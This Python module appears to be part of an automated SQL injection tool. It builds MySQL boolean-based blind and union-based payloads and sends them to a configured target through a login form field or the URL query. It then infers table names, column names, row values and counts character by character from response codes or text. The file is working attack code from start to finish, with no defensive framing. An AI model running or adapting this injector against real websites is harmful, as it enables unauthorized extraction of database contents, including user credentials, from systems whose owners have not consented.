import core.config as cfg
from core.payloads import *
import sys
import string
import aiohttp
import time
import re

async def inject_payload(session, data):
    #payload_table_name_union_based = table_name_payloads_union_based["MySQL"][0].format(offset=offset)

    payload_table_name = table_name_payloads_boolean_based_blind["MySQL"][0].format(position=data["letter_position"], offset=data["offset"], operator=data["operator"], char=data["char"])
    payload_column_name = column_name_payloads_boolean_based_blind["MySQL"][0].format(position=data["letter_position"], table=cfg.usr_table, offset=data["offset"], operator=data["operator"], char=data["char"])
    payload_entity_name = entity_name_payloads_boolean_based_blind["MySQL"][0].format(column=cfg.usr_column, position=data["letter_position"], table=cfg.usr_table, offset=data["offset"], operator=data["operator"], char=data["char"])
    payload_entity_count = entity_count_payloads_boolean_based_blind["MySQL"][0].format(column=cfg.usr_column, table=cfg.usr_table, operator=data["operator"], num=data["num"])
    payload_table_name_union_based = table_name_payloads_union_based["MySQL"][0].format(offset=data["offset"])
    payload_column_name_union_based = column_name_payloads_union_based["MySQL"][0].format(table=cfg.usr_table, offset=data["offset"])
    payload_entity_name_union_based = entity_name_payloads_union_based["MySQL"][0].format(column=cfg.usr_column, table=cfg.usr_table, offset=data["offset"])
    
    post_payload_table_name = table_name_payloads_boolean_based_blind["MySQL"][1].format(position=data['letter_position'], offset=data['offset'], operator=data['operator'], char=data['char'])
    post_payload_entity_name = entity_name_payloads_boolean_based_blind["MySQL"][1].format(column=cfg.usr_column, position=data['letter_position'], table=cfg.usr_table, offset=data['offset'], operator=data['operator'], char=data['char'])

    if cfg.usr_http_method == 'POST':
        try:
            injectable_data = aiohttp.FormData()
            injectable_data.add_field("login", post_payload_table_name)
            injectable_data.add_field("pass", "whatever")

            async with session.post(cfg.usr_url, data=injectable_data, headers=cfg.headers) as response:
                #sys.stdout.write("\033[s\n")
                response_text = await response.text()
                #print(f"[*] payload: [{data['letter_position']}]: {data['operator']}'{data['char']}' || status: {response.status}")
                #sys.stdout.flush()
                #sys.stdout.write("\033[u")
                #sys.stdout.write(f"\033[2K\r[+] table name: {data['general_name']}| offset [{data['offset']}]")
                ####
                sys.stdout.write("\033[2K\r")
                sys.stdout.write("\033[F")
                sys.stdout.write("\033[2K")
                sys.stdout.write(f"[*] retrieve: {data['general_name']} | offset [{data['offset']}] || {response.status}    \n")
                sys.stdout.write("\033[2K\r")
                sys.stdout.write(f"[*] payload[{data['letter_position']}]: {data['operator']}'{data['char']}'")
                sys.stdout.flush()
                if not re.search(r"\[null\]", response_text):
                    return response_text
        except Exception as e:
            print("error: ", e)
            exit(0)
    else:
        if cfg.usr_mode == 'table-test':
            async with session.get(cfg.usr_url+payload_table_name_union_based, allow_redirects=True) as response:
                sys.stdout.write("\033[s\n")
                print(f"[*] payload: None")
                sys.stdout.flush()
        
                sys.stdout.write("\033[u")
                sys.stdout.write(f"\033[2K\r[+] table name: | offset [{data['offset']}]")
                return response.url

        elif cfg.usr_mode == 'column-test':
            async with session.get(cfg.usr_url+payload_column_name_union_based, allow_redirects=True) as response:
                sys.stdout.write("\033[s\n")
                print(f"[*] payload: None")
                sys.stdout.flush()

                sys.stdout.write("\033[u")
                sys.stdout.write(f"\033[2K\r[+] column name: | offset [{data['offset']}]")
                return response.url

        if cfg.usr_mode == 'entity-test':
            async with session.get(cfg.usr_url+payload_entity_name_union_based, allow_redirects=True) as response:
                sys.stdout.write("\033[s\n")
                print(f"[*] payload: None")
                sys.stdout.flush()

                sys.stdout.write("\033[u")
                sys.stdout.write(f"\033[2K\r[+] entity name: | offset [{data['offset']}] || {response.status}")
                return response.url

        elif cfg.usr_mode == 'table':
            async with session.get(cfg.usr_url+payload_table_name, allow_redirects=False) as response:
                #sys.stdout.write("\033[2K\r")
                #sys.stdout.write(f"[*] retrieve: {data['general_name']} | offset [{data['offset']}] || {response.status}\n"))
                #sys.stdout.write("\033[2K\r")
                #sys.stdout.write(f"[*] payload[{data['letter_position']}]: {data['operator']}'{data['char']}' || {payload_table_name}")
                #sys.stdout.flush()
                #return response.status == cfg.true_code
                ####
                sys.stdout.write("\033[2K\r")
                sys.stdout.write("\033[F")
                sys.stdout.write("\033[2K")
                sys.stdout.write(f"[*] retrieve: {data['general_name']} | offset [{data['offset']}] || {response.status}    \n")
                sys.stdout.write("\033[2K\r")
                sys.stdout.write(f"[*] payload[{data['letter_position']}]: {data['operator']}'{data['char']}'")
                sys.stdout.flush()
                #sys.stdout.write("\033[F")
                #sys.stdout.write("\033[s")
                #sys.stdout.write("\033[u")
                return response.status == cfg.true_code

        elif cfg.usr_mode == 'column':
            async with session.get(cfg.usr_url+payload_column_name, allow_redirects=False) as response:
                sys.stdout.write("\033[s\n")
                print(f"[*] payload[{data['letter_position']}]: {data['operator']}'{data['char']}' || {cfg.usr_url}{payload_column_name}")
                sys.stdout.flush()

                sys.stdout.write("\033[u")
                sys.stdout.write(f"\033[2K\r[+] column name: {data['general_name']} | offset [{data['offset']}] || {response.status}")
                return response.status == cfg.true_code

        elif cfg.usr_mode == 'entity':
            async with session.get(cfg.usr_url+payload_entity_name, allow_redirects=False) as response:
                sys.stdout.write("\033[s\n")
                print(f"[*] payload[{data['letter_position']}]: {data['char']} || {cfg.usr_url}{payload_entity_name}")
                sys.stdout.flush()
        
                sys.stdout.write("\033[u")
                sys.stdout.write(f"\033[2K\r[+] entity name: {data['general_name']} | offset [{data['offset']}] || {response.status}")
                return response.status == cfg.true_code

        elif cfg.usr_mode == 'entity-count':
            async with session.get(cfg.usr_url+payload_entity_count, allow_redirects=False) as response:
                sys.stdout.write("\033[s\n")
                print(f"[*] payload: {data['num']}")
                sys.stdout.flush()
        
                sys.stdout.write("\033[u")
                sys.stdout.write(f"\033[2K\r[+] entity count: {data['entity_counter']} | offset [{data['offset']}] || {response.status}")
                return response.status == cfg.true_code
        else:
            print("[!] wrong game mode")
            return 1


